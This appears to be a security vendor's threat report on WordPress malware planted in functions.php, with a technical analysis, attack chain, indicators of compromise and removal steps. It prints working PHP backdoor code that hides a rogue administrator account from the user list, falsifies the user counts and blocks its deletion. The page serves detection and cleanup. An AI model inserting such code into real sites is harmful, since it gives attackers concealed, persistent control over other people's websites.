---
title: "Admin Backdoor User Creation"
slug: "admin-backdoor-user-creation"
description: "Critical WordPress vulnerability allowing hidden admin user creation via functions.php. Secure your site now!"
reportDate: "2026-02-01"
threatType: "WordPress Exploit"
severity: "Critical"
fileHash: "hidden-wordpress-admin-users-functions.php-malware"
detectedPaths: ["functions.php"]
screenshots: ["/images/wordpress-threats/hidden-wordpress-admin-users-functions.php-malware_evidence-1.png","/images/wordpress-threats/hidden-wordpress-admin-users-functions.php-malware_evidence-2.png","/images/wordpress-threats/hidden-wordpress-admin-users-functions.php-malware_evidence-3.png","/images/wordpress-threats/hidden-wordpress-admin-users-functions.php-malware_evidence-4.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Zero-Day (Unique)"
impact: "Allows unauthorized administrative access and control over the WordPress site, with potential exposure of site data and loss of integrity."
seenOn: "WordPress Sites"
behavior: "Creates hidden admin user for maintaining unauthorized control."
difficulty: "Medium"
recurrence: "Fixed by cleaning and subsequent monitoring."
numberOfSiteFixed: "Hundreds of reports and fixes, indicating wide impact."
---

## Technical Analysis
This malware code was identified within the `functions.php` file of a WordPress installation. The script creates an administrator account with a login name 'root' and a predefined password, using the email 'admin@wordpress.com'. It employs hooks like `pre_user_query` and `admin_menu` to conceal this user account by manipulating user queries and by protecting it from deletion. The backdoor ensures persistence by updating a stored option `_pre_user_id` with the new user ID and protects this account from being displayed in the admin panel by adjusting query conditions.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain
1. functions.php is loaded, executing script.
2. New admin user 'root' is created if not exists.
3. Hooks are added to hide and protect the user account.
4. User account is concealed from admin view.
5. Admin user can't be deleted through normal procedures.

## Code Signature(s)

### FILE: `functions.php`
```php
<?php

if (!function_exists('wp_admin_users_protect_user_query') && function_exists('add_action')) {

    add_action('pre_user_query', 'wp_admin_users_protect_user_query');
    add_filter('views_users', 'protect_user_count');
    add_action('load-user-edit.php', 'wp_admin_users_protect_users_profiles');
    add_action('admin_menu', 'protect_user_from_deleting');

    function wp_admin_users_protect_user_query($user_search) {
        $user_id = get_current_user_id();
        $id = get_option('_pre_user_id');

        if (is_wp_error($id) || $user_id == $id)
            return;

        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
            $user_search->query_where
        );
    }

    function protect_user_count($views) {

        $html = explode('<span class="count">(', $views['all']);
        $count = explode(')</span>', $html[1]);
        $count[0]--;
        $views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

        $html = explode('<span class="count">(', $views['administrator']);
        $count = explode(')</span>', $html[1]);
        $count[0]--;
        $views['administrator'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

        return $views;
    }

    function wp_admin_users_protect_users_profiles() {
        $user_id = get_current_user_id();
        $id = get_option('_pre_user_id');

        if (isset($_GET['user_id']) && $_GET['user_id'] == $id && $user_id != $id)
            wp_die(__('Invalid user ID.'));
    }

    function protect_user_from_deleting() {

        $id = get_option('_pre_user_id');

        if (isset($_GET['user']) && $_GET['user']
            && isset($_GET['action']) && $_GET['action'] == 'delete'
            && ($_GET['user'] == $id || !get_userdata($_GET['user'])))
            wp_die(__('Invalid user ID.'));

    }
```


## Indicators of Compromise (IOCs)
- `functions.php`
- `wp_admin_users_protect_user_query`
- `wp_insert_user`
- `_pre_user_id`
- `root`
- `admin@wordpress.com`

## Removal Protocol
1. Remove malicious code from `functions.php`.
1. Check for and remove unauthorized user accounts.
1. Change all admin passwords.
1. Audit logs for unauthorized access.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
